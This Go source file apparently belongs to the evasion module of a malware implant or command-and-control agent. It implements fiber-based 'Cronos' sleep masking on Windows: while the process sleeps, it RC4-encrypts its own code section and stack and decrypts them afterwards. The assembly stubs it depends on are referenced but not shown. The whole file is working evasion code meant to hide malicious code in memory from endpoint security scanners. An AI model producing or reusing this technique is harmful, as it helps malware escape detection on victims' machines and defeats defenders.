//go:build windows && amd64

package evasion

import (
    "crypto/rand"
    "fmt"
    "runtime"
    "syscall"
    "unsafe"
)

var (
    cronosKernel32              = syscall.NewLazyDLL("kernel32.dll")
    procConvertThreadToFiber    = cronosKernel32.NewProc("ConvertThreadToFiber")
    procCreateFiber             = cronosKernel32.NewProc("CreateFiber")
    procSwitchToFiber           = cronosKernel32.NewProc("SwitchToFiber")
    procConvertFiberToThread    = cronosKernel32.NewProc("ConvertFiberToThread")
    procDeleteFiber             = cronosKernel32.NewProc("DeleteFiber")
    procWaitForSingleObject     = cronosKernel32.NewProc("WaitForSingleObject")
    procCreateEventA            = cronosKernel32.NewProc("CreateEventA")
)

// cronosCtx is the structure the assembly fiber body reads. It lives
// on the Go stack of the caller, not in .data, so it is not touched
// if .data encryption is ever added.
//
// Layout is fixed: the assembly reads fields at known offsets. Any
// change here must be mirrored in the assembly.
type cronosCtx struct {
    // Offsets from the start of the struct. Do not reorder.
    primaryFiber    uintptr    // +0x00
    encryptFiber    uintptr    // +0x08
    eventHandle     uintptr    // +0x10
    durationMs      uint32     // +0x18
    _               uint32     // +0x1C padding
    key             [16]byte   // +0x20
    textBase        uintptr    // +0x30
    textSize        uintptr    // +0x38
    stackBase       uintptr    // +0x40
    stackSize       uintptr    // +0x48
    rc4Addr         uintptr    // +0x50
}

// The following functions are implemented in
// sleepmask_cronos_windows_amd64.s. They must not enter the Go
// runtime, because they run either on a fiber stack that the
// runtime does not know about, or on the primary fiber with the
// Go stack encrypted.

// cronosSwitchStub switches to the encrypt fiber. Called from Go
// while the stack is still plaintext; the stub itself is the
// transition point.
//
//go:nosplit
func cronosSwitchStub(ctx *cronosCtx)

// cronosFiberEntryPC returns the raw PC of cronosFiberEntry so that
// CreateFiber can be given a native function pointer rather than a
// Go callback trampoline.
//
//go:nosplit
func cronosFiberEntryPC() uintptr

// setSwitchToFiberAddr and setWaitForSingleObjectAddr publish the
// resolved proc addresses to the assembly stubs. They must be
// called before cronosSwitchStub runs.
//
//go:nosplit
func setSwitchToFiberAddr(addr uintptr)

//go:nosplit
func setWaitForSingleObjectAddr(addr uintptr)

// maskedSleepCronos performs a Cronos fiber-based sleep.
func maskedSleepCronos(ms uint32) error {
    runtime.LockOSThread()
    defer runtime.UnlockOSThread()

    // Resolve everything we need before encryption.
    if err := procConvertThreadToFiber.Find(); err != nil {
        return fmt.Errorf("resolve ConvertThreadToFiber: %w", err)
    }
    if err := procCreateFiber.Find(); err != nil {
        return fmt.Errorf("resolve CreateFiber: %w", err)
    }
    if err := procSwitchToFiber.Find(); err != nil {
        return fmt.Errorf("resolve SwitchToFiber: %w", err)
    }
    if err := procWaitForSingleObject.Find(); err != nil {
        return fmt.Errorf("resolve WaitForSingleObject: %w", err)
    }
    if err := procCreateEventA.Find(); err != nil {
        return fmt.Errorf("resolve CreateEventA: %w", err)
    }
    setSwitchToFiberAddr(procSwitchToFiber.Addr())
    setWaitForSingleObjectAddr(procWaitForSingleObject.Addr())
    rc4Addr, err := NativeRC4Addr()
    if err != nil {
        return err
    }
    textBase, textSize, err := TextSection()
    if err != nil {
        return fmt.Errorf("locate .text: %w", err)
    }
    stackBase, stackSize, err := currentStackRegion()
    if err != nil {
        return fmt.Errorf("locate stack: %w", err)
    }

    // Allocate the context on the heap so the stack mask (which
    // encrypts the region above SP + 0x1000) cannot reach it. A
    // stack-local ctx would be encrypted the moment the encrypt
    // fiber reads it. The Go escape analyser may keep this on the
    // stack if it decides the pointer does not escape; using
    // new(cronosCtx) forces a heap allocation in the common case.
    ctx := new(cronosCtx)
    ctx.durationMs = ms
    ctx.textBase = textBase
    ctx.textSize = textSize
    ctx.stackBase = stackBase
    ctx.stackSize = stackSize
    ctx.rc4Addr = rc4Addr
    if _, err := rand.Read(ctx.key[:]); err != nil {
        return fmt.Errorf("generate key: %w", err)
    }

    // Create the manual-reset event the fiber body waits on.
    event, _, _ := procCreateEventA.Call(0, 0, 0, 0)
    if event == 0 {
        return fmt.Errorf("CreateEventA failed")
    }
    defer syscall.CloseHandle(syscall.Handle(event))
    ctx.eventHandle = event

    // Convert the current thread to a fiber. The returned handle is
    // the primary fiber and is what the encrypt fiber switches back
    // to when it finishes.
    primary, _, _ := procConvertThreadToFiber.Call(0)
    if primary == 0 {
        return fmt.Errorf("ConvertThreadToFiber failed")
    }
    ctx.primaryFiber = primary
    defer procConvertFiberToThread.Call()

    // Create the encrypt fiber. The entry point is a raw native
    // function pointer, not a Go callback.
    encrypt, _, _ := procCreateFiber.Call(
        0,
        cronosFiberEntryPC(),
        uintptr(unsafe.Pointer(ctx)))
    if encrypt == 0 {
        return fmt.Errorf("CreateFiber failed")
    }
    ctx.encryptFiber = encrypt
    defer procDeleteFiber.Call(encrypt)

    // Switch to the encrypt fiber. It encrypts, waits, decrypts, and
    // switches back. Control returns here only after the round trip.
    cronosSwitchStub(ctx)

    return nil
}